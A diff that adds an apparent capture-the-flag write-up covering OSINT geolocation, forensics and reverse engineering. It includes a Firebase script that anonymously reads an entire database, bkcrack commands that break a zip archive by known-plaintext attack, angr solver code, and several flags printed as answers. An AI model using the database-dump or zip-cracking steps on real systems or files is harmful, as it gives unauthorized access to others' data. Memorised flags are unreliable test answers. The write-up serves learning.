+const app = initializeApp(firebaseConfig)
+const database = getDatabase(app)
+const auth = getAuth(app)
+
+async function readData() {
+  try {
+    await signInAnonymously(auth)
+    const dbRef = ref(database)
+    const snapshot = await get(dbRef)
+
+    if (snapshot.exists()) {
+      console.log('Data from database:', snapshot.val())
+    } else {
+      console.log('No data available')
+    }
+  } catch (error) {
+    console.error('Error:', error)
+  }
+}
+
+readData()
+```
+
+# OSINT
+
+## Lost At Sea
+
+- You are given an image and need to find its **exact coordinates**.
+
+![Initial scene](./Pasted%20image%2020250119154146.png)
+
+---
+
+- At first I search for the `NOVOTEL`, and reverse search the cropped image of the hotel.
+  ![Novotel search](./Pasted%20image%2020250119160436.png)
+
+---
+
+- I found the location at `lyon, france` and tried every possible attempts from the angle (street view) ... none of them works, I even tried changing different time.
+
+![Lyon search](./Pasted%20image%2020250119160852.png)
+
+---
+
+- Then, after multiple attempts, I click at the `river` and open the `street view`.
+
+![River view](./Pasted%20image%2020250119161753.png)
+
+---
+
+- After `analyze and compare` the `image and street view`, I found out they are the same, the exact coords is at the `link url in red`.
+
+![Final coordinates](./Pasted%20image%2020250119155109.png)
+
+---
+
+## Garry: Beyond Music's End 3
+
+Desc: Garry and his friends seem to be talking about a new threat group that steals wizard data, wonder what the fuzz is all about...
+
+---
+
+- This one need to find the `github repo` since they mentioned `repo`.
+
+![Github search](./Screenshot%202025-01-19%20at%204.46.13%20PM.png)
+
+---
+
+- After looking through the files, I found out they prob removed it. But, you can still find it via `Activity`
+
+![Github activity](./Pasted%20image%2020250119165000.png)
+
+---
+
+- Bingo!
+
+![Found repo](./Pasted%20image%2020250119164814.png)
+
+---
+
+## Garry: Beyond Music's End 4
+
+Desc: Garry made a new post, I heard he is gonna be a Supreme Wizard today!
+
+---
+
+- In `Garry's x.com` from `Garry: Beyond Music's End 1`, the image description in the gif contains a `link`.
+
+![X.com post](./Screenshot%202025-01-18%20at%206.35.09%20PM.png)
+
+---
+
+- The `link` navigates to a `brainfuck code`.
+  ![Brainfuck code](./Screenshot%202025-01-18%20at%206.34.36%20PM%201.png)
+
+---
+
+- Decrypting `brainfuck code` gets you a `discord link`.
+  ![Discord link](./Pasted%20image%2020250119163523.png)
+
+---
+
+- Inside `discord link`, got `plus code`.
+  ![Plus code](./Screenshot%202025-01-19%20at%204.36.31%20PM.png)
+
+---
+
+- After research `plus code`, it gets to the `location`.
+  ![Location found](./Pasted%20image%2020250119163930.png)
+
+# Brainfuck
+
+## Determination
+
+- Whoever made this challenge, I'll send assassins to u. JK... JK...
+- This challenge is so cooked...
+
+---
+
+- First, I use `premiere pro` to `0.25x speed`.
+- and yes, I watched every frames 😭
+- The challenge is to `spot the flag` `hidden sight` in the video.
+- You get the flag in `3 parts`.
+- The first one ||look bottom left corner||
+  ![Part 1](./Screenshot%202025-01-19%20at%205.00.13%20PM.png)
+- The second one ||left besides tree in white dream||
+  ![Part 2](./Pasted%20image%2020250119172906.png)
+- The third one ||look under the window||
+  ![Part 3](./Pasted%20image%2020250119171128.png)
+- The flag (for those who don't want to cooked): `EQCTF{R3AL_3L1T3_3Y3S1GHT}`
+
+---
+
+# Forensic
+
+## Velociraptor (Unintended)
+
+1. Download the attach file
+2. VeLoCiraptor\C\Users\kelvin\AppData\Roaming\Microsoft\Windows\Recent
+   - We can found some hash on this page with the file name `RVFDVEZ7MXRzX3IzNExseV9o` and `MG1ldzBya190UnVTdF9tMyF9`
+     ![image](./image2.png)
+3. Then just cyberchef it.
+
+## Kuih Lapis
+
+1. Download the poem.pdf file
+2. Throw it into [pdf inspect](https://pdfcrowd.com/inspect-pdf/) website and we will see all the details in this page
+3. And we can see the details and flag at here ![image](./image.png)
+
+## Lost Password
+
+1. Download the zip file.
+2. We can see inside have cloud_password.txt and a index.html file.
+   ![image](./image/imagebk1.png)
+3. With the use of BKCrack, we can use known plaintext attack on pkzip
+4. Next find the common bytes in the index.html file(why html file? as we dont know the starters of the cloud_password.txt)
+   ![image](./image/imagebk2.png)
+5. Save those code in a file call bin
+6. Then
+   `bkcrack -C html.zip -c "index.html" -p bin`
+7. After getting the key, Continue to crack it
+   `bkcrack -C html.zip -k 1d63e85a b3b66126 33619315 -U bkbk.zip 1234`
+8. 1d63e85a b3b66126 33619315 is the key, and 1234 is the password we set.
+9. Then unzip the zip file bkbk.zip with pass 1234.
+10. Thats it the flag here
+    ![flag](./image/imagelah.png)
+
+# Reverse Engineering
+
+## Baka Mitai
+
+![](./Reverse_Engineering/Baka_Mitai/assets/question.png)
+
+### Goals
+
+1. Check file information using checksec
+2. Decompilation using ghidra, check the flagchecker flow
+3. Deploy angr script, perform symbolic analysis
+   _References:_
+   https://shinmao.github.io/posts/2022/02/bp1/
+   https://github.com/jakespringer/angr_ctf
+
+---
+
+1. Using checksec, we realised the file is dynamcally linked, stripped
+   ![](./Reverse_Engineering/Baka_Mitai/assets/fileinfo.png)
+2. Decompile with ghidra, since it's stripped, we have to find the main entry from entry function
+   ![](./Reverse_Engineering/Baka_Mitai/assets/entryFunction.png)
+3. Try to rename the variables, functions, for ease of analysis
+   ![](./Reverse_Engineering/Baka_Mitai/assets/renamed.png)
+   From this point, we could know that:
+
+- The program proceed if flag length == 0x37 (55 characters),
+- It go through complex transformation, lastly doing flagcheck and tell if the flag provide from user input is correct
+- Well, we are not going to reverse and go through these complex transformations.
+- Instead, we will deploy angr script, automate this process
+
+4. I deployed the angr script on google colab
+   ![](./Reverse_Engineering/Baka_Mitai/assets/googleColab.png)
+
+```python
+!pip install angr
+
+import angr
+import claripy
+
+# Define binary path and parameters
+input_file_path = './chall'
+flag_length = 55
+known_string = 'EQCTF{'
+FIND_ADDR = 0x4016e4
+AVOID_ADDR = [0x4016fa, 0x40159f]
+START_ADDR = 0x40158d
+
+# Load the binary
+proj = angr.Project(input_file_path, auto_load_libs=False, main_opts={'base_addr': 0x400000})
+
+# Create symbolic characters for the flag
+known_chars = [claripy.BVV((known_string[i])) for i in range(len(known_string))]
+flag_chars = [claripy.BVS(f"flag_{i}", 8) for i in range(flag_length - len(known_string))]
+flag = claripy.Concat(*known_chars + flag_chars)
+
+# Create a blank state at the start address
+state = proj.factory.blank_state(addr=START_ADDR)
+state.options.add(angr.options.LAZY_SOLVES)
+state.options.add(angr.options.UNICORN)
+
+# Define the address of the local variable `local_58` (e.g., `[RBP - 0x50]`)
+# Assume RBP is initialized to some stack base (common for blank_state)
+stack_base = state.regs.rbp
+local_58_address = stack_base - 0x50  # Offset to local variable `local_58`
+
+# Store the symbolic flag into `local_58`
+state.memory.store(local_58_address, flag)
+
+# Pass the address of `local_58` in RDI (used by __isoc23_scanf)
+state.regs.rdi = local_58_address
+
+# Add constraints to ensure flag is printable (ASCII range 0x20 to 0x7e)
+for k in flag_chars:
+    state.solver.add(k < 0x7f)  # Less than 0x7f (127)
+    state.solver.add(k > 0x20)  # Greater than 0x20 (32)
+
+# Create a simulation manager
+sim_manager = proj.factory.simulation_manager(state)
+
+# Explore paths to find the target address while avoiding bad paths
+sim_manager.explore(find=FIND_ADDR, avoid=AVOID_ADDR)
+
+# Check if a solution was found
+if len(sim_manager.found) > 0:
+    # Evaluate the symbolic flag to retrieve its value
+    solution = sim_manager.found[0].solver.eval(flag, cast_to=bytes)
+    print(f"Flag found: {solution.decode()}")
+else:
+    print("No solution found.")
+```
+
+To understand how this script works in details, do check out the references provided, and follow the tutorials.
+The scripting is hard, it just follow a strict template.
+However, there are few points worth mentioning,
+
+- the start_addr, should be placed after scanf CALL instruction, better if placed at where complex transformation start
+- symbolic stack approach is an important point, specifically for this challenge where you can't just use a universal angr template
+- blank_state should be used instead of entry_state because strlen is called before scanf, if you define the sim manager with entry state, it will waste extra resources going through strlen library call. Within all libc library call, there are mutex locks which angr cant deal with, which is why you need to hook the function and simulate user input with symbolic memory
+- find_addr, is the desired memory location where the instance of "Correct" is reached
+- avoid_addr are the memory location to avoid such as "Wrong"
+
+### Final Result
+
+---
+
+![](./Reverse_Engineering/Baka_Mitai/assets/finalResult.png)
+
+## Cryptic Token Diffusion
+
+![](./Reverse_Engineering/Cryptic_Token_Diffusion/assets/question.png)
+
+---
+
+### Goals
+
+1. Perform binary diffing
+2. Match index number to correspond characters
+3. Rearrange the character in ascending order according to their index number
+   _Tools required: vbindiff_
+
+---
+
+1. Viewing the files, there are two versions of application. Thus, we try to compare the difference between versions.
+   ![](./Reverse_Engineering/Cryptic_Token_Diffusion/assets/files.png)
+
+```bash
+vbindiff vault-v1.0.0.elf vault-1.2.1.elf
+```
+
+2. Observe the pattern, we realised that there are two parts showing difference in binaries: - vault-v1.0.0 acts as the index number, corresponds to the characters in vault-v1.2.1
+   _Part 1_
+   ![](./Reverse_Engineering/Cryptic_Token_Diffusion/assets/diff1.png)
+   _Part 2_
+   ![](./Reverse_Engineering/Cryptic_Token_Diffusion/assets/diff2.png)
+
+- List out all the correspondence, sort them in ascending order, turn to ASCII and print it out
+
+```python
+v1p1 = [12, 28, 0, 23, 15, 21, 10, 4, 27, 5, 26, 8, 17, 3, 18, 25]
+v1p2 = [9, 13, 7, 24, 6, 2, 1, 11, 14, 22, 29, 16, 19, 20]
+
+v2p1 = [0x37, 0x67, 0x45, 0x31, 0x62, 0x5f, 0x30, 0x46, 0x6e, 0x7b, 0x31, 0x74, 0x6e, 0x54, 0x34, 0x66]
+v2p2 = [0x72, 0x30, 0x6E, 0x66, 0x31, 0x43, 0x51, 0x5F, 0x5F, 0x64, 0x7D, 0x31, 0x72, 0x79]
+
+v1 = v1p1 + v1p2
+v2 = v2p1 + v2p2
+
+pairs = sorted(zip(v1, v2))
+
+sorted_ascii = ''.join(chr(value) for _, value in pairs)
+
+print(sorted_ascii)
+```
+
+### Final Result
+
+---
+
+![](./Reverse_Engineering/Cryptic_Token_Diffusion/assets/solution.png)
+
+## Gen Z
+
+![](./Reverse_Engineering/Gen_Z/assets/question.png)
+
+---
+
+### Goals
+
+1. Deobfuscate the C code, you may choose not to as it just work
+2. Observe the log, figure out how the flag might relate to the timestamp
+
+---
+
+1. Opening the file, you will see obfuscated C code
+
+```cpp
+#define rn ;
+#define finna =
+#define cap !=
+#define mf *
+#define bouta &
+#define ongod ++
+#define sheesh <
+#define fr <<
+#define bet if
+#define chief main
+#define yikes break
+#define deadass return
+#define skibidi {
+#define tho }
+#define bussin cout
+#define huh true
+#define lit double
+
+#include <iostream>
+#include <fstream>
+#include <iomanip>
+#include <openssl/sha.h>
+
+
+using namespace std rn
+
+unsigned int seed() skibidi
+    deadass static_cast<unsigned int>(time(nullptr)) rn
+tho
+
+string getHash(lit value) skibidi
+    ostringstream oss rn
+    oss fr setprecision(17) fr value rn
+    string text finna oss.str() rn
+    unsigned char hash[SHA256_DIGEST_LENGTH] rn
+    SHA256(reinterpret_cast<const unsigned char mf>(text.c_str()), text.size(), hash) rn
+    ostringstream result rn
+    for (int i finna 0 rn i sheesh SHA256_DIGEST_LENGTH rn i ongod) {
+        result fr hex fr setw(2) fr setfill('0') fr static_cast<int>(hash[i]) rn
+    tho
+    deadass result.str() rn
+tho
+
+
+int chief() skibidi
+    while (huh) skibidi
+        unsigned int s finna seed() rn
+        srand(s) rn
+        int x finna rand() rn
+
+        string flag finna getHash(x) rn
+
+        bet (flag.find("a9ba358e") cap string::npos) {  
+            ofstream outfile("./flag") rn
+            bet (outfile.is_open()) {
+                outfile fr "EQCTF{" fr flag fr "tho" rn
+                outfile.close() rn
+            tho
+            yikes rn
+        tho
+
+        time_t now finna time(0) rn
+        tm mf ltm finna localtime(bouta now) rn
+
+
+        bussin fr "[" fr 1900 + ltm->tm_year fr "-" rn
+        bussin fr 1 + ltm->tm_mon fr "-" rn
+        bussin fr ltm->tm_mday fr "] " rn
+        bussin fr "🤓☝️ erm actually, you're incorrect 🥺👉👈: " fr x fr endl rn
+    tho
+    bussin fr "Good job Skibidisigma 🐺🥶 - Adolf Rizzler 🗿" fr endl rn
+
+    deadass 0 rn
+tho
+```
+
+Just replace the obfuscated part with its actual symbol as shown in define list, to ease our debugging process.
+
+2. After debobfuscation,
+
+```cpp
+#include <iostream>
+#include <fstream>
+#include <iomanip>
+#include <openssl/sha.h>
+
+using namespace std;
+
+unsigned int seed()
+{
+    return static_cast<unsigned int>(time(nullptr));
+}
+
+string getHash(double value)
+{
+    ostringstream oss;
+    oss << setprecision(17) << value;
+    string text = oss.str();
+
+    unsigned char hash[SHA256_DIGEST_LENGTH];
+    SHA256(reinterpret_cast<const unsigned char *>(text.c_str()), text.size(), hash);
+
+    ostringstream result;
+    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++)
+    {
+        result << hex << setw(2) << setfill('0') << static_cast<int>(hash[i]);
+    }
+    return result.str();
+}
+
+
+int main()
+{
+    while (true)
+    {
+        unsigned int s = seed();
+        srand(s);
+        int x = rand();
+
+        string flag = getHash(x);
+
+        if (flag.find("a9ba358e") != string::npos)
+        {
+            ofstream outfile("./flag");
+            if (outfile.is_open())
+            {
+                outfile << "EQCTF{" << flag << "}";
+                outfile.close();
+            }
+            break;
+        }
+
+        time_t now = time(0);
+        tm *ltm = localtime(&now);
+
+        cout << "[" << 1900 + ltm->tm_year << "-";
+        cout << 1 + ltm->tm_mon << "-";
+        cout << ltm->tm_mday << "] ";
+        cout << "🤓☝️ erm actually, you're incorrect 🥺👉👈: " << x << endl;
+    }
+    cout << "Good job Skibidisigma 🐺🥶 - Adolf Rizzler 🗿" << x << endl;
+
+    return 0;
+}
+```
+
+3. Observing the logfile,
+   ![](./Reverse_Engineering/Gen_Z/assets/logfile.png)
+   We should focus that flag is paired up on \[2025-01-01], so we should patch our c code to run on that time stamp, and which we just need to fix the seed() function
+   Part that affect:
+
+```cpp
+unsigned int s = seed();
+srand(s);
+int x = rand();
+```
+
+Patched seed() function:
+
+```cpp
+// Brute-force timestamp around 2025-01-01
+unsigned int seed() {
+    static time_t test_time = 1735689600;  // 2025-01-01 00:00:00 UTC
+    if (test_time <= 1735775999) {  // 2025-01-01 23:59:59 UTC
+        return static_cast<unsigned int>(test_time++);
+    }
+    return static_cast<unsigned int>(time(nullptr)); // Fallback to current time
+}
+// -------------------------------------------
+// You may also add the line for Found correct seed: to indicate that you found correct seed
+if (flag.find("a9ba358e") != string::npos) {
+	ofstream outfile("./flag");
+	if (outfile.is_open()) {
+		outfile << "EQCTF{" << flag << "}";
+		outfile.close(); }
+		cout << "Found correct seed: " << s << endl;
+		break;
+	}
+...
+...
+```
+
+4. Due to the usage of openssl/sha.h, we should compile our C++ file as below
+
+```bash
+g++ -o gen_z chall.cpp -lssl -lcrypto
+```
+
+5. Execute the file
+
+```bash
+./gen_z
+```
+
+### Final result
+
+---
+
+![](./Reverse_Engineering/Gen_Z/assets/correctSeed.png)
+And flag file is generated:
+![](./Reverse_Engineering/Gen_Z/assets/flag.png)
